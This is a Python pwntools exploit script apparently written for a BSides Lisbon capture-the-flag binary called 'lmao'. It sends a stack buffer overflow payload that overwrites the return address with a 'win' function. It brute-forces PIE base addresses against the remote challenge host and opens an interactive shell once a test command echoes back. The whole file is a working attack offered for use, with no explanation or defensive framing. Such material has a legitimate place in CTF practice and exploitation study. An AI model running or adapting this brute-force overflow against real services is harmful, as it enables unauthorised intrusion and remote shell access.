#!/usr/bin/env python3

from pwn import *

# Set up pwntools
context.update(arch='amd64', os='linux', log_level='info')

# Load the binary
exe = ELF('./dist/src/lmao')

def try_exploit(host, port, base_addr):
    """Try exploit with a specific base address"""
    try:
        target = remote(host, port, timeout=2)
        target.recvuntil(b"You say: ")
        
        payload = b"LMAO"
        payload += b"A" * (32 - 4)
        payload += b"B" * 8
        
        win_addr = base_addr + 0x11a9
        payload += p64(win_addr)
        
        target.sendline(payload)
        
        # Try to execute a command
        target.sendline(b"echo SUCCESS123")
        
        try:
            response = target.recvuntil(b"SUCCESS123", timeout=1)
            if b"SUCCESS123" in response:
                log.success(f"Found working base address: {hex(base_addr)}")
                return target
        except:
            pass
        
        target.close()
        return None
    except Exception as e:
        return None

def main():
    host = "7b44d3bf-0008-4576-b715-b08d8cb090b7-lmao.challs.bsideslisbon.org"
    port = 20298
    
    # Common PIE base addresses (page-aligned)
    bases_to_try = [
        0x555555554000,
        0x555555555000,
        0x555555556000,
        0x7ffff7ffd000,
        0x400000,  # Non-PIE
    ]
    
    # Also try some randomized addresses
    for i in range(256):
        bases_to_try.append(0x555555554000 + (i * 0x1000))
    
    log.info("Starting brute force attack...")
    
    for i, base in enumerate(bases_to_try):
        if i % 10 == 0:
            log.info(f"Progress: {i}/{len(bases_to_try)} attempts")
        
        target = try_exploit(host, port, base)
        if target:
            log.success("Shell obtained!")
            target.interactive()
            return
    
    log.error("Failed to find working address")

if __name__ == "__main__":
    main()
